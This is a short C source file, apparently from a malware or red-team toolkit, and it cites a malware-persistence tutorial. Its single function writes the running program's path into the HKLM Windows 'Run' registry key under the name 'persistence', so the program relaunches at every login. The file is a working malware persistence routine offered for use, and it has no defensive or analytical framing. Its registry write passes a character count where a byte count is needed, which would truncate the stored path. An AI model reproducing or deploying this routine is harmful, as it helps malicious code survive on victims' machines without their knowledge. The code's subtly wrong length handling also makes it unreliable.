#include "box.h"

// https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html

BOOL WindowsRegistry()
{

	HKEY hKey = NULL;
	WCHAR ExePath[MAX_PATH];
	GetModuleFileNameW(NULL, ExePath, MAX_PATH); // gets executable path

	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_EXECUTE, &hKey) != ERROR_SUCCESS)
	{
		WARN("Failed To Open Windows Registry Key!");
		PRINT_ERROR("RegOpenKeyExW");
		return FALSE;
	}

	if (RegSetValueExW(hKey, L"persistence", 0, REG_SZ, (PBYTE)ExePath, wcslen(ExePath)) != ERROR_SUCCESS)
	{
		WARN("Failed To Set New Registry Key!");
		PRINT_ERROR("RegSetValueExW");
		return FALSE;
	}

	RegCloseKey(hKey);

	return TRUE;

}